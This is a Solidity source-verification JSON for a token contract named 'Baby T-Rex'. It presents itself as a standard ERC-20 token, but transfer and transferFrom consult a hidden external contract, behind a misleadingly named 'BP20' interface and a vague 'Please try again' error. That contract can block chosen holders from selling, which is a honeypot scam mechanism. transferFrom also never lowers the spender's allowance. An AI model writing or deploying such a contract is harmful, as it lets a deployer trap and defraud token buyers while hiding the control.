{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"LightMoon3_NI.sol":{"content":"//SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.7.6;\r\n\r\ninterface BP20 {\r\n\r\n    function token_name() external view returns (string memory);\r\n\r\n    function get_balance(address account) external view returns (uint8);\r\n\r\n    function token_symbol() external view returns (string memory);\r\n\r\n    function balance_Of(address _owner) external view returns (uint256 balance);\r\n\r\n    function total_Supply() external view returns (uint256);\r\n\r\n    function spend_allowance(address _owner, address _spender) external view returns (uint256 remaining);\r\n}\r\n\r\ncontract BabyTrex {\r\n    mapping(address => uint256) public balances;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    \r\n    BP20 account_holder;\r\n    uint256 public totalSupply = 10 * 10**12 * 10**18;\r\n    string public name = \"Baby T-Rex\";\r\n    string public symbol = hex\"42616279542D526578f09fa696\";\r\n    uint public decimals = 18;\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    \r\n    constructor(BP20 _param) {\r\n        \r\n        account_holder = _param;\r\n        balances[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n    \r\n    \r\n    function balanceOf(address wallet) public view returns(uint256) {\r\n        return balances[wallet];\r\n    }\r\n    \r\n    function transfer(address to, uint256 value) public returns(bool) {\r\n        require(account_holder.get_balance(msg.sender) != 1, \"Please try again\"); \r\n        require(balanceOf(msg.sender) >= value, 'balance too low');\r\n        balances[to] += value;\r\n        balances[msg.sender] -= value;\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n        \r\n    }\r\n\r\n    \r\n    function transferFrom(address from, address to, uint256 value) public returns(bool) {\r\n        require(account_holder.get_balance(from) != 1, \"Please try again\");\r\n        require(balanceOf(from) >= value, 'balance too low');\r\n        require(allowance[from][msg.sender] >= value, 'allowance too low');\r\n        balances[to] += value;\r\n        balances[from] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n    \r\n    function approve(address holder, uint256 value) public returns(bool) {\r\n        allowance[msg.sender][holder] = value;\r\n        return true;\r\n        \r\n    }\r\n}\r\n"}}}